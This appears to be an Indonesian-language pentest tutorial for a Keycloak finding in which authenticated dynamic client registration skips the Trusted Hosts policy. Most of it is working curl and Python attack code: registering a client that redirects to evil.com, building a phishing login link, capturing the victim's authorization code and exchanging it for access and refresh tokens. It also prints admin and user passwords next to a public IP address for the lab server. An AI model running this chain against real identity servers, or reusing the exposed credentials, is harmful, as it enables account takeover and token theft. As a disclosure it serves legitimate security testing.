# Tutorial: Finding #5 — DCR Trusted Hosts Bypass → Token Theft

**Severity:** HIGH (CVSS 8.0)
**Waktu demo:** ~10 menit
**Kebutuhan:** 2 Terminal + Browser (Admin Console)
**Ini finding paling impactful — full token theft dari victim!**

---

## Skenario Serangan

1. **Attacker** (punya akun biasa + role `create-client`) register OIDC client dengan `redirect_uri: https://evil.com/steal`
2. **Victim** klik link login → melihat halaman Keycloak yang legitimate → login
3. Auth code dikirim ke **evil.com** → attacker tukar jadi **token victim**

---

## Langkah 0: Pastikan Keycloak Berjalan

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

---

## Langkah 1: (ADMIN SETUP) Assign create-client Role ke testuser

### Via Admin Console:
1. Buka: `http://46.101.162.187:8080/admin/master/console/`
2. Login: `admin` / `Admin1234`
3. Realm **test** → **Users** → klik **testuser**
4. Tab **Role mappings** → klik **Assign role**
5. Filter by client → pilih **realm-management**
6. Centang **create-client** → klik **Assign**

### Atau via CLI:
```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users?username=testuser" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

RM_CLIENT=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients?clientId=realm-management" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

CREATE_ROLE=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients/$RM_CLIENT/roles/create-client")

curl -s -o /dev/null -w "Assign role: HTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "[$CREATE_ROLE]" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/role-mappings/clients/$RM_CLIENT"
```

---

## Langkah 2: (ATTACKER) Login dan Dapatkan Token

Attacker login sebagai `testuser` (user biasa dengan create-client role):

```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp" \
  -d "grant_type=password" \
  -d "username=testuser" \
  -d "password=Password123" \
  -d "scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Attacker token: ${ATTACKER_TOKEN:0:40}..."
```

---

## Langkah 3: (ATTACKER) Register Client Jahat dengan redirect ke evil.com

```bash
REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Legitimate Looking App",
    "redirect_uris": ["https://evil.com/steal"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"]
  }')

echo "$REG_RESP" | python3 -c "
import sys,json
d = json.load(sys.stdin)
print('=== CLIENT JAHAT TERDAFTAR! ===')
print(f'Client ID:     {d[\"client_id\"]}')
print(f'Client Secret: {d[\"client_secret\"]}')
print(f'Redirect URI:  {d[\"redirect_uris\"]}')
print('================================')
"
```

**Simpan nilai ini** — kita butuhkan nanti:
```bash
MAL_CLIENT_ID=$(echo "$REG_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['client_id'])")
MAL_SECRET=$(echo "$REG_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['client_secret'])")
echo "Client ID: $MAL_CLIENT_ID"
echo "Secret: $MAL_SECRET"
```

> **VULNERABLE:** Client dengan `redirect_uri: https://evil.com/steal` berhasil terdaftar! Tidak ada penolakan dari Trusted Hosts policy!

---

## Langkah 4: (KONTROL) Anonymous DCR — Harus Ditolak

Bandingkan dengan registrasi tanpa autentikasi:

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{"client_name":"anon-test","redirect_uris":["https://evil.com/steal"]}' \
  | python3 -m json.tool
```

**Output (Correctly Blocked):**
```json
{
  "error": "insufficient_scope",
  "error_description": "Policy 'Trusted Hosts' rejected request... Host not trusted."
}
```

> Anonymous DCR ditolak oleh Trusted Hosts — tapi authenticated DCR lolos! Ini policy gap.

---

## Langkah 5: (ATTACKER) Buat Phishing URL untuk Victim

```bash
echo ""
echo "=== PHISHING URL ==="
echo "Kirim link ini ke victim (URL terlihat legitimate — domain Keycloak):"
echo ""
echo "http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=${MAL_CLIENT_ID}&response_type=code&redirect_uri=https://evil.com/steal&scope=openid+profile+email"
echo ""
echo "===================="
```

> Victim melihat URL Keycloak yang trusted — tidak ada tanda-tanda mencurigakan!

---

## Langkah 6: (VICTIM) Login di Halaman Keycloak — Simulasi

Kita simulasikan victim login menggunakan curl:

```bash
# Ambil halaman login
AUTH_PAGE=$(curl -si -c /tmp/victim_cookies.txt \
  "http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=${MAL_CLIENT_ID}&response_type=code&redirect_uri=https://evil.com/steal&scope=openid+profile+email" 2>&1)

# Ambil form action URL
ACTION_URL=$(echo "$AUTH_PAGE" | grep -oP 'action="([^"]+)"' | head -1 | sed 's/action="//;s/"//' | sed 's/&amp;/\&/g')

echo "Login form URL: $ACTION_URL"

# Victim masukkan kredensialnya (victim / Password123)
VICTIM_RESP=$(curl -si -c /tmp/victim_cookies.txt -b /tmp/victim_cookies.txt \
  -X POST "$ACTION_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=victim&password=Password123&credentialId=" 2>&1)

# Lihat kemana redirect-nya
REDIRECT=$(echo "$VICTIM_RESP" | grep -oP 'Location: \K[^\r\n]+' | head -1)
echo ""
echo "=== REDIRECT SETELAH LOGIN ==="
echo "$REDIRECT"
echo "==============================="
```

**Output (VULNERABLE):**
```
=== REDIRECT SETELAH LOGIN ===
https://evil.com/steal?session_state=...&iss=...&code=XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX...
===============================
```

> **AUTH CODE DIKIRIM KE EVIL.COM!** Victim login di Keycloak yang legitimate, tapi code-nya jatuh ke tangan attacker!

---

## Langkah 7: (ATTACKER) Extract Auth Code

```bash
AUTH_CODE=$(echo "$REDIRECT" | grep -oP 'code=\K[^&]+')
echo "Stolen auth code: $AUTH_CODE"
```

---

## Langkah 8: (ATTACKER) Tukar Code → Victim's Tokens

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$MAL_CLIENT_ID" \
  -d "client_secret=$MAL_SECRET" \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "redirect_uri=https://evil.com/steal" \
  | python3 -c "
import sys,json,base64
d = json.load(sys.stdin)
if 'error' in d:
    print('Error:', d)
    sys.exit(1)

at = d['access_token']
payload = at.split('.')[1] + '=='
claims = json.loads(base64.b64decode(payload))

print('')
print('====================================')
print('  TOKEN VICTIM BERHASIL DICURI!')
print('====================================')
print(f'  Username:      {claims.get(\"preferred_username\")}')
print(f'  Email:         {claims.get(\"email\")}')
print(f'  User ID:       {claims.get(\"sub\")}')
print(f'  Scope:         {d.get(\"scope\")}')
print(f'  Access Token:  {at[:50]}...')
print(f'  Refresh Token: {d.get(\"refresh_token\",\"\")[:50]}...')
print('====================================')
print()
print('Attacker sekarang punya akses penuh ke akun victim!')
"
```

**Output:**
```
====================================
  TOKEN VICTIM BERHASIL DICURI!
====================================
  Username:      victim
  Email:         victim@test.com
  User ID:       41f28100-04a6-4902-9049-0585e5f38dee
  Scope:         openid profile email
  Access Token:  eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2...
  Refresh Token: eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2...
====================================
```

---

## Langkah 9: Jalankan Python PoC (Otomatis Semua)

```bash
python3 pocs/poc_f5_dcr_hijack.py --host http://localhost:8080
```

---

## Ringkasan

| Langkah | Aksi | Hasil |
|---|---|---|
| 1 | Attacker register client via DCR | Client dengan evil.com redirect — **BERHASIL** |
| 2 | Control: Anonymous DCR | **DITOLAK** oleh Trusted Hosts |
| 3 | Victim klik phishing URL | Halaman login Keycloak yang legitimate |
| 4 | Victim login | Auth code redirect ke evil.com — **DICURI** |
| 5 | Attacker tukar code | Token victim — **DICURI PENUH** |

**Policy Gap:**
- **Anonymous DCR:** Trusted Hosts ENFORCED (benar)
- **Authenticated DCR:** Trusted Hosts **TIDAK ADA** (vulnerability)
- **Admin REST API:** Return 403 (benar)

**Kesimpulan:** Satu user dengan role `create-client` bisa mencuri token user manapun di realm yang sama, termasuk admin.
